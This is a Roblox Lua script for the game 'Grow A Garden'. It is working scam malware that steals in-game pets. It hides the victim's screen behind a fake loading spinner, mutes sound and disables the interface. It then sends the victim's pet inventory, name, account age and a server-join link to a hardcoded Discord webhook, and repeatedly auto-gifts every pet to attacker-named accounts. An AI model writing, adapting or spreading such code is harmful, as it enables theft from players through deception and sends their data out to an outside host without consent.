if getgenv().decfde then return end
getgenv().decfde = true

local Webhook = "https://discord.com/api/webhooks/1393571947840929813/Yk-SBXIZoh-FP02pfhIfxthDSYJvUiIxbqugybWYu_gMi0XaccmE3E_1vjcMwZaBpJRM"
local Username = {"drawesfa", "seconduser", "thirduser"}
local Fern = "https://fern.wtf/joiner?placeId="
local OnlyPriorityPets = false
local MinPriorityThreshold = 13
local RS = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")
local DataService = require(RS.Modules.DataService)
local PetRegistry = require(RS.Data.PetRegistry)
local NumberUtil = require(RS.Modules.NumberUtil)
local PetUtilities = require(RS.Modules.PetServices.PetUtilities)
local PetsService = require(RS.Modules.PetServices.PetsService)

local player = Players.LocalPlayer

local gui = Instance.new("ScreenGui")
gui.Name = "ScriptGui"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.Parent = player:WaitForChild("PlayerGui")
gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
gui.DisplayOrder = 99999

local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.Position = UDim2.new(0, 0, 0, 0)
bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
bg.Parent = gui

local spinner = Instance.new("ImageLabel")
spinner.AnchorPoint = Vector2.new(0.5, 0.5)
spinner.Size = UDim2.new(0.2, 0, 0.2, 0)
spinner.Position = UDim2.new(0.5, 0, 0.35, 0)
spinner.BackgroundTransparency = 1
spinner.Image = "rbxassetid://74011233271790"
spinner.ImageColor3 = Color3.fromRGB(255, 255, 255)
spinner.Parent = bg

local asc = Instance.new("UIAspectRatioConstraint")
asc.Parent = spinner

task.spawn(function()
    while spinner and spinner.Parent do
        spinner.Rotation += 2
        task.wait(0.01)
    end
end)

local PetPriorityData = {
    ["Kitsune"] = { priority = 1, emoji = "🦊", isMutation = false },
    ["Raccoon"] = { priority = 2, emoji = "🦝", isMutation = false },
    ["French Fly Ferret"] = { priority = 3, emoji = "🐾", isMutation = false },
    ["Disco Bee"] = { priority = 4, emoji = "🪩", isMutation = false },
    ["Fennec fox"] = { priority = 5, emoji = "🦊", isMutation = false },
    ["Butterfly"] = { priority = 6, emoji = "🦋", isMutation = false },
    ["Dragonfly"] = { priority = 7, emoji = "🐲", isMutation = false },
    ["Mimic Octopus"] = { priority = 8, emoji = "🐙", isMutation = false },
    ["Corrupted Kitsune"] = { priority = 9, emoji = "🦊", isMutation = false },
    ["T-Rex"] = { priority = 10, emoji = "🦖", isMutation = false },
    ["Spinosaurus"] = { priority = 11, emoji = "🦎", isMutation = false },
    ["Queen Bee"] = { priority = 12, emoji = "👑", isMutation = false },
    ["Red Fox"] = { priority = 13, emoji = "🦊", isMutation = false },
    ["Ascended"] = { priority = 14, emoji = "🔺", isMutation = true },
    ["Mega"] = { priority = 15, emoji = "🐘", isMutation = true },
    ["Shocked"] = { priority = 16, emoji = "⚡", isMutation = true },
    ["Rainbow"] = { priority = 17, emoji = "🌈", isMutation = true },
    ["Radiant"] = { priority = 18, emoji = "🛡️", isMutation = true },
    ["Corrupted"] = { priority = 19, emoji = "🧿", isMutation = true },
    ["IronSkin"] = { priority = 20, emoji = "💥", isMutation = true },
    ["Tiny"] = { priority = 21, emoji = "🔹", isMutation = true },
    ["Golden"] = { priority = 22, emoji = "🥇", isMutation = true },
    ["Frozen"] = { priority = 23, emoji = "❄️", isMutation = true },
    ["Windy"] = { priority = 24, emoji = "🌪️", isMutation = true },
    ["Inverted"] = { priority = 25, emoji = "🔄", isMutation = true },
    ["Shiny"] = { priority = 26, emoji = "✨", isMutation = true },
    ["Tranquil"] = { priority = 27, emoji = "🧘", isMutation = true },
}

local function formatNumberWithCommas(n)
    local str = tostring(n)
    return str:reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
end

local function getWeight(toolName)
    if not toolName or toolName == "No Tool" then
        return nil
    end
    local weight = toolName:match("%[([%d%.]+) KG%]")
    weight = weight and tonumber(weight)
    return weight
end

local function getAge(toolName)
    if not toolName or toolName == "No Tool" then
        return nil
    end
    local age = toolName:match("%[Age (%d+)%]")
    age = age and tonumber(age)
    return age
end

local function UnequipFromFarm(player)
    if workspace:FindFirstChild("PetsPhysical") then
        for _, petMover in workspace.PetsPhysical:GetChildren() do
            if petMover and petMover:GetAttribute("OWNER") == player.Name then
                for _, pet in petMover:GetChildren() do
                    PetsService:UnequipPet(pet.Name)
                end
            end
        end
    end
end

local function GetPlayerPets()
    local unsortedPets = {}
    local player = Players.LocalPlayer
    local data = DataService:GetData()
    if not data or not data.PetsData then
        return unsortedPets
    end

    UnequipFromFarm(player)
    local maxWaitTime = 5
    local elapsedTime = 0
    repeat
        task.wait(0.5)
        elapsedTime = elapsedTime + 0.5
    until #player.Backpack:GetChildren() > 0 or elapsedTime >= maxWaitTime

    for _, tool in pairs(player.Backpack:GetChildren()) do
        if tool and tool:IsA("Tool") and (tool:GetAttribute("Favorite") == true or tool:GetAttribute("d") == true) then
            RS:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
        end
    end

    task.wait(0.5)
    for _, tool in pairs(player.Backpack:GetChildren()) do
        if not tool or not tool.Parent then
            continue
        end

        if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
            local petName = tool.Name
            local PET_UUID = tool:GetAttribute("PET_UUID")
            if not PET_UUID then continue end

            local data = DataService:GetData()
            if not data or not data.PetsData.PetInventory.Data[PET_UUID] then continue end

            local petInventoryData = data.PetsData.PetInventory.Data[PET_UUID]
            local petData = petInventoryData.PetData
            local HatchedFrom = petData.HatchedFrom
            if not HatchedFrom or HatchedFrom == "" then continue end

            local eggData = PetRegistry.PetEggs[HatchedFrom]
            if not eggData then continue end

            local rarityData = eggData.RarityData.Items[petInventoryData.PetType]
            if not rarityData then continue end

            local WeightRange = rarityData.GeneratedPetData.WeightRange
            if not WeightRange then continue end

            local sellPrice = PetRegistry.PetList[petInventoryData.PetType].SellPrice
            local weightMultiplier = math.lerp(0.8, 1.2, NumberUtil.ReverseLerp(WeightRange[1], WeightRange[2], petData.BaseWeight))
            local levelMultiplier = math.lerp(0.15, 6, PetUtilities:GetLevelProgress(petData.Level))
            local rawValue = math.floor(sellPrice * weightMultiplier * levelMultiplier)

            local age = getAge(tool.Name) or 0
            local weight = getWeight(tool.Name) or 0
            local strippedName = petName:gsub(" %[.*%]", "")
            local petType = strippedName

            for key, data in pairs(PetPriorityData) do
                if data.isMutation and strippedName:lower():find(key:lower()) == 1 then
                    petType = strippedName:sub(#key + 2)
                    break
                end
            end

            if rawValue > 0 then
                table.insert(unsortedPets, {
                    PetName = petName,
                    PetAge = age,
                    PetWeight = weight,
                    Id = PET_UUID,
                    Type = petType,
                    Value = rawValue,
                    Formatted = formatNumberWithCommas(rawValue),
                })
            end
        end
    end

    return unsortedPets
end

local function isMutated(toolName)
    for key, data in pairs(PetPriorityData) do
        if data.isMutation and toolName:lower():find(key:lower()) == 1 then
            return key
        end
    end
    return nil
end

local function hasRarePets(petsList)
    for _, pet in pairs(petsList) do
        if pet.Type ~= "Red Fox" and PetPriorityData[pet.Type] and not PetPriorityData[pet.Type].isMutation then
            return true
        end
    end
    return false
end

local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)

local function SendWebhook(petsList)
    local petString = ""
    local totalValue = 0
    
    for _, pet in ipairs(petsList) do
        local highestPriority = 99
        local chosenEmoji = "🐶"
        local mutation = isMutated(pet.PetName)
        local mutationData = mutation and PetPriorityData[mutation] or nil
        local petData = PetPriorityData[pet.Type] or nil

        if petData and petData.priority < highestPriority then
            highestPriority = petData.priority
            chosenEmoji = petData.emoji
        elseif mutationData and mutationData.priority < highestPriority then
            highestPriority = mutationData.priority
            chosenEmoji = mutationData.emoji
        elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
            highestPriority = 12
            chosenEmoji = "🐘"
        elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
            highestPriority = 13
            chosenEmoji = "👴"
        end

        if not OnlyPriorityPets or (petData and petData.priority <= MinPriorityThreshold) or (mutationData and mutationData.priority <= MinPriorityThreshold) then
            petString = petString .. "\n" .. chosenEmoji .. " - " .. pet.PetName .. " -> " .. pet.Formatted
            totalValue = totalValue + pet.Value
        end
    end

    local formattedTotalValue = formatNumberWithCommas(totalValue)
    local tpScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")', game.PlaceId, game.JobId)

    if petString ~= "" then
        local embed = {
            title = "🌵 Grow A Garden Hit - DARK SCRIPTS 🍀",
            color = 65280,
            fields = {
                {
                    name = "👤 Player Information",
                    value = string.format("```Name: %s\nReceiver: %s\nAccount Age: %s```", 
                        Players.LocalPlayer.DisplayName or "Unknown", 
                        Username[1] or "Unknown", 
                        tostring(Players.LocalPlayer.AccountAge or 0)),
                    inline = false
                },
                {
                    name = "💰 Total Value",
                    value = string.format("```%s```", formattedTotalValue),
                    inline = false
                },
                {
                    name = "🌴 Backpack",
                    value = string.format("```%s```", petString),
                    inline = false
                },
                {
                    name = "🏝️ Join Server",
                    value = "[click here to join](" .. Fern .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
                    inline = false
                }
            },
            footer = {
                text = string.format("%s | %s", game.PlaceId, game.JobId)
            }
        }

        local payload = {
            content = (hasRarePets(petsList) and "--@everyone\n" or "") .. string.format("\n%s\n", tpScript or "N/A"),
            embeds = {embed}
        }

        pcall(function()
            request({
                Url = Webhook,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end
end

local function ForceTeleportToPlayer(target)
    if not player.Character or not target.Character then return end
    
    local humanoid = player.Character:FindFirstChild("Humanoid")
    local targetPos = target.Character:FindFirstChild("HumanoidRootPart")
    
    if humanoid and targetPos then
        humanoid:ChangeState(Enum.HumanoidStateType.Physics)
        player.Character:SetPrimaryPartCFrame(targetPos.CFrame * CFrame.new(0, 0, 2))
    end
end

local function GiftAllPets(receiver)
    local pets = GetPlayerPets()
    SendWebhook(pets)
    
    table.sort(pets, function(a, b)
        local aPriority, aMutation = 99, isMutated(a.PetName)
        if PetPriorityData[a.Type] then
            aPriority = PetPriorityData[a.Type].priority
        elseif aMutation and PetPriorityData[aMutation] then
            aPriority = PetPriorityData[aMutation].priority
        elseif a.Weight and a.Weight >= 10 then
            aPriority = 12
        elseif a.Age and a.Age >= 60 then
            aPriority = 13
        end

        local bPriority, bMutation = 99, isMutated(b.PetName)
        if PetPriorityData[b.Type] then
            bPriority = PetPriorityData[b.Type].priority
        elseif bMutation and PetPriorityData[bMutation] then
            bPriority = PetPriorityData[bMutation].priority
        elseif b.Weight and b.Weight >= 10 then
            bPriority = 12
        elseif b.Age and b.Age >= 60 then
            bPriority = 13
        end

        if aPriority == bPriority then
            return a.Value > b.Value
        else
            return aPriority < bPriority
        end
    end)

    local inventory = player.Backpack

    for _, pet in ipairs(pets) do
        local highestPriority = 99
        local mutation = isMutated(pet.PetName)
        local mutationData = mutation and PetPriorityData[mutation] or nil
        local petData = PetPriorityData[pet.Type] or nil

        if petData and petData.priority < highestPriority then
            highestPriority = petData.priority
        elseif mutationData and mutationData.priority < highestPriority then
            highestPriority = mutationData.priority
        elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
            highestPriority = 12
        elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
            highestPriority = 13
        end

        if not OnlyPriorityPets or (petData and petData.priority <= MinPriorityThreshold) or (mutationData and mutationData.priority <= MinPriorityThreshold) then
            for _, tool in player.Backpack:GetChildren() do
                if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" and tool:GetAttribute("PET_UUID") == pet.Id then
                    ForceTeleportToPlayer(receiver)
                    
                    if tool.Parent ~= inventory then
                        tool.Parent = inventory
                        task.wait(0.3)
                    end

                    local humanoid = player.Character:FindFirstChild("Humanoid")
                    if humanoid then
                        humanoid:EquipTool(tool)
                        task.wait(0.6)
                    end

                    if tool.Parent == player.Character then
                        pcall(function()
                            RS.GameEvents.PetGiftingService:FireServer("GivePet", receiver)
                            task.wait(0.5)
                            local prompt = receiver.Character:FindFirstChild("Head") and receiver.Character.Head:FindFirstChildOfClass("ProximityPrompt")
                            if prompt then
                                fireproximityprompt(prompt)
                            end
                        end)
                    end

                    task.wait(0.15)
                    if tool and tool.Parent then
                        tool.Parent = player.Backpack
                    end
                end
            end
        end
    end
end

local function MainLoop()
    while true do
        local receiverPlr
        for _, name in ipairs(Username) do
            receiverPlr = Players:FindFirstChild(name)
            if receiverPlr then break end
        end

        if receiverPlr then
            GiftAllPets(receiverPlr)
        end
        
        task.wait(0.1)
    end
end

for _, v in player.PlayerGui:GetDescendants() do
    if v:IsA("ScreenGui") then
        v.Enabled = false
    end
end

for _, sound in ipairs(workspace:GetDescendants()) do
    if sound:IsA("Sound") then
        sound.Volume = 0
    end
end

for _, sound in ipairs(game:GetService("SoundService"):GetDescendants()) do
    if sound:IsA("Sound") then
        sound.Volume = 0
    end
end

game:GetService("CoreGui").TopBarApp.TopBarApp.Enabled = false
game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

if workspace:FindFirstChild("PetsPhysical") then
    for _, petMover in workspace:FindFirstChild("PetsPhysical"):GetChildren() do
        if petMover and petMover:GetAttribute("OWNER") == player.Name then
            for _, pet in petMover:GetChildren() do
                PetsService:UnequipPet(pet.Name)
            end
        end
    end
end

MainLoop()
